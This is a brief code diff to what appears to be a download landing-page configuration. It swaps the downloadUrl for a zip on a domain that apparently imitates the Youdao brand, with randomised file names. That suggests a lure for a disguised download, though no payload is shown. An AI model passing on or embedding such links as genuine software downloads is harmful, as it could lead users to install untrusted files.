@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://youdaoselw.icu/Aex_win10-11_RrdBocksxhs_8275.zip", 
+    downloadUrl: "https://youdaoselw.icu/Pxs_win7-11_RodBrks-xhs_4836.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
